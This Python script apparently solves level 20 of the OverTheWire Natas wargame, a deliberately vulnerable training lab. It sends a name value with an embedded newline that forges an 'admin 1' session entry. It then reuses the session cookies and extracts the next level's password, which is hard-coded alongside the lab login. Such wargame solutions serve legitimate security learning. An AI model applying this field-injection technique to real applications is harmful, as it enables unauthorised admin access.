import requests
import re


URL = 'http://natas20.natas.labs.overthewire.org/index.php?debug=true'
AUTH = ('natas20', 'guVaZ3ET35LbgbFMoaN5tFcYT1jEP7UH')


payload = dict(name='test\nadmin 1')        # send \n followed by admin 1 to read admin credentials

response = requests.post(url=URL, auth=AUTH, data=payload)

cookies = response.cookies.get_dict()       # save the sessions from previous request

response = requests.get(url=URL, auth=AUTH, cookies=cookies)        # use the cookies in second request\

response_text = response.content.decode()

match = print('password', re.findall(r'Password: (.*?)</pre>', response_text))
